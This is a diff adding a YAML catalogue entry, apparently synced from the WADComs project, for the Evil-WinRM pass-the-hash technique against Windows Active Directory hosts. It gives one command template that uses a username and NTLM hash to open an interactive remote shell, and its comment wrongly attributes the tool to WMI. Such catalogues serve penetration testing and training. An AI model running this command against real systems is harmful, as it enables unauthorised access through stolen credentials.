@@ -1,0 +1,29 @@
+id: wadcoms/evil-winrm-pth
+type: technique
+platform: active-directory
+name: Evil WinRM PTH
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- a valid username
+- an NTLM hash (pass-the-hash)
+commands:
+- template: evil-winrm -i 10.10.10.1 -u john -H c23b2e293fa0d312de6f59fd6d58eae3
+  comment: 'Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell
+    on the Windows host. Evil-WinRM supports passing the victim''s NT hash for authorization. Command
+    Reference: Target IP: 10.10.10.1 Username: john NT Hash: c23b2e293fa0d312de6f59fd6d58eae3'
+references:
+- https://github.com/Hackplayers/evil-winrm
+tags:
+- active-directory
+- wadcoms
+- wmi
